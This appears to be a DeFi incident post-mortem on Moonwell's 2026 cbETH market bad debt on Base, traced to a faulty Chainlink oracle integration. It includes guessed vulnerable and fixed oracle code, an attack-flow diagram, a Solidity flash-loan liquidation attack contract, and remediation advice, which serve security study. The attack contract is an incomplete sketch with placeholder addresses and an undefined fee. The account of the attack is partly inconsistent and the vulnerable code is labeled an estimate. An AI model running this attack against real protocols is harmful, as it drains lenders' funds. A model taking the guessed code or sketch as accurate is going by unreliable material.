# Moonwell — Bad Debt Analysis from Faulty Chainlink Oracle Integration

| Field | Details |
|------|------|
| **Date** | 2026-02-15 |
| **Protocol** | Moonwell |
| **Chain** | Base |
| **Loss** | $1,780,000 (Bad Debt) |
| **Attacker** | Unknown |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | Moonwell mcbETH market contract |
| **Root Cause** | Faulty Chainlink oracle integration caused cbETH price to be overvalued, allowing excessive borrowing followed by unliquidatable bad debt |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

Moonwell is a lending protocol on the Base chain that operates a `mcbETH` market accepting cbETH (Coinbase Staked ETH) as collateral. This market queries the USD price of cbETH via a Chainlink oracle, but the oracle integration was flawed, causing it to reference a price higher than the actual value.

As a result, collateral value was overestimated, allowing the attacker (or malicious borrower) to borrow beyond the true collateral value. As the market price converged toward the oracle price, the positions became unliquidatable bad debt.

Attack flow:
1. Flash loan a large amount of cbETH from Aerodrome
2. Liquidate the victim's position (cbETH collateral with overvalued oracle price)
3. Repay with cbETH obtained by redeeming the liquidated mcbETH
4. Swap cbETH back on Aerodrome to repay the flash loan

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (estimated)

```solidity
// ❌ Vulnerable: cbETH/USD price is simply calculated as ETH/USD × cbETH/ETH
//               but cbETH/ETH exchange rate is read from a stale or incorrect feed
function getPrice(address asset) external view returns (uint256) {
    if (asset == cbETH) {
        // ETH/USD Chainlink feed
        (, int256 ethUsdPrice,,,) = ethUsdFeed.latestRoundData();
        // ❌ cbETH/ETH feed - wrong feed address or staleness allowed
        (, int256 cbEthEthRate,,,) = cbEthEthFeed.latestRoundData();
        // ❌ No staleness check → stale cbEthEthRate may be used
        return uint256(ethUsdPrice) * uint256(cbEthEthRate) / 1e18;
    }
    // ...
}
```

### Fixed Code

```solidity
// ✅ Fixed: staleness check + correct feed address + dual validation
uint256 constant MAX_STALENESS = 3600; // 1 hour

function getPrice(address asset) external view returns (uint256) {
    if (asset == cbETH) {
        (
            uint80 roundId,
            int256 ethUsdPrice,
            ,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = ethUsdFeed.latestRoundData();

        // ✅ Staleness check
        require(block.timestamp - updatedAt <= MAX_STALENESS, "ETH/USD stale");
        require(answeredInRound >= roundId, "ETH/USD incomplete round");
        require(ethUsdPrice > 0, "ETH/USD invalid price");

        (
            uint80 roundId2,
            int256 cbEthEthRate,
            ,
            uint256 updatedAt2,
            uint80 answeredInRound2
        ) = cbEthEthFeed.latestRoundData();

        // ✅ cbETH/ETH staleness check
        require(block.timestamp - updatedAt2 <= MAX_STALENESS, "cbETH/ETH stale");
        require(answeredInRound2 >= roundId2, "cbETH/ETH incomplete round");
        require(cbEthEthRate > 0, "cbETH/ETH invalid price");

        return uint256(ethUsdPrice) * uint256(cbEthEthRate) / 1e18;
    }
    // ...
}
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─[1] Flash loan cbETH from Aerodrome DEX
  │         Acquire large amount of cbETH
  │
  ├─[2] Analyze Moonwell market
  │         Identify victim positions where collateral value > actual value
  │         due to oracle overvaluation
  │
  ├─[3] Liquidate victim position (liquidateBorrow)
  │         ┌─ Attacker: provides some cbETH
  │         └─ Receives: mcbETH (discounted collateral)
  │         ⚠️  Liquidation profit inflated by oracle overvaluation
  │
  ├─[4] Redeem mcbETH → cbETH
  │         Call Moonwell's redeem()
  │         Convert mcbETH back to cbETH
  │
  ├─[5] Swap cbETH → other tokens on Aerodrome
  │         Acquire tokens to repay the flash loan
  │
  └─[6] Repay Aerodrome flash loan
        Net result:
        - Attacker: liquidation profit + oracle mispricing arbitrage
        - Protocol: $1.78M bad debt (unliquidatable positions remain)
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAerodrome {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IMoonwellMarket {
    function liquidateBorrow(
        address borrower,
        uint repayAmount,
        address mTokenCollateral
    ) external returns (uint);

    function redeem(uint redeemTokens) external returns (uint);
    function balanceOf(address account) external view returns (uint);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MoonwellAttack {
    address constant cbETH = 0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;
    IMoonwellMarket constant mcbETH = IMoonwellMarket(0x...);
    IAerodrome constant aerodrome = IAerodrome(0x...);

    address victim; // liquidation target

    function attack(address _victim) external {
        victim = _victim;
        // [1] Borrow cbETH via Aerodrome flash loan
        aerodrome.swap(0, 100e18, address(this), abi.encode("flash"));
    }

    function hook(uint256 amount, bytes calldata) external {
        // [3] Liquidate victim position
        IERC20(cbETH).approve(address(mcbETH), amount);
        mcbETH.liquidateBorrow(victim, amount, address(mcbETH));

        // [4] Convert received mcbETH → cbETH
        uint256 mcbETHBalance = mcbETH.balanceOf(address(this));
        mcbETH.redeem(mcbETHBalance);

        // [5] Swap profit cbETH → other tokens and repay
        uint256 cbETHBalance = IERC20(cbETH).balanceOf(address(this));
        // Repay flash loan principal + fee
        IERC20(cbETH).transfer(msg.sender, amount + fee);
        // Remainder is profit
    }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Faulty Oracle Integration |
| **Attack Vector** | Oracle overvaluation → excessive borrowing → unliquidatable |
| **Impact Scope** | Entire mcbETH market, protocol solvency |
| **DASP Classification** | Price Oracle Manipulation/Error |
| **CWE** | CWE-20: Improper Input Validation |
| **Severity** | Critical |

### Detailed Description

The bad debt scenario differs from a typical hack in that the attacker does not directly steal funds — instead, they **exploit the protocol's oracle error to borrow excessively and avoid repayment**. The following items must be validated when integrating Chainlink:

- Staleness check for `latestRoundData()` (`block.timestamp - updatedAt`)
- Handling of negative or zero price returns
- `answeredInRound >= roundId` completeness check
- Accuracy of feed addresses (especially intermediate exchange rate feeds for derivative assets)

---

## 6. Remediation Recommendations

1. **Mandatory Chainlink staleness checks**: Set and enforce a `MAX_STALENESS` threshold
2. **Negative/zero price validation**: Add `require(price > 0)` condition
3. **Multi-oracle usage**: Use Chainlink + Pyth or TWAP as a secondary source to prevent single feed failure
4. **Circuit breaker**: Temporarily pause new borrowing when price deviation exceeds a threshold (e.g., 10%)
5. **Bad debt insurance**: Build a loss absorption mechanism via protocol reserves to handle oracle failure
6. **Regular oracle audits**: Periodically review the addresses, versions, and update frequencies of all Chainlink feeds in use

---

## 7. Lessons Learned

- **Using Chainlink does not guarantee safety**: Without correct integration, Chainlink itself can become a vulnerability. All fields returned by `latestRoundData()` must be validated.
- **Derivative assets (LSTs) require dual oracles**: LSTs such as cbETH and stETH must accurately reference both the underlying asset price and the exchange rate.
- **Bad debt threatens protocol survival**: Bad debt can pose a greater long-term threat to protocol sustainability than direct fund losses.
- **The health of the liquidation mechanism depends on oracle accuracy**: If the oracle is wrong, there is a bidirectional risk — liquidations may become impossible, or healthy positions may be incorrectly liquidated.